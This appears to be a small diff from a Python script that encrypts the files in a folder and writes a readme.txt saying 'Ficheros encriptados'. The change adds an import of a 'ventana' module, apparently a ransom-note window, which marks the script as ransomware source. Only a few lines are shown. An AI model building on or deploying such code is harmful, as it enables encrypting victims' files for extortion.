@@ -45,3 +45,5 @@ if __name__ == '__main__':
     encrypt(ruta,key)
     with open(ruta+'/'+'readme.txt', 'w') as file:
         file.write('Ficheros encriptados\n')
+    import ventana
+        
